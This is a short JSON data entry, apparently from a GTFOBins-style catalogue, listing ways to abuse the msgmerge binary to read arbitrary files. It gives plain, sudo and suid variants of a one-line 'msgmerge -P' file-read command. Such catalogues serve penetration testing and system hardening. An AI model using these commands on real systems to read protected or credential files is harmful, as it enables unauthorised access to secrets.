{
  "functions": {
    "file-read": [
      {
        
        "code": "LFILE=file_to_read\nmsgmerge -P $LFILE /dev/null\n"
      }
    ],
    "sudo": [
      {
        
        "code": "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null\n"
      }
    ],
    "suid": [
      {
        
        "code": "LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n"
      }
    ]
  }
}
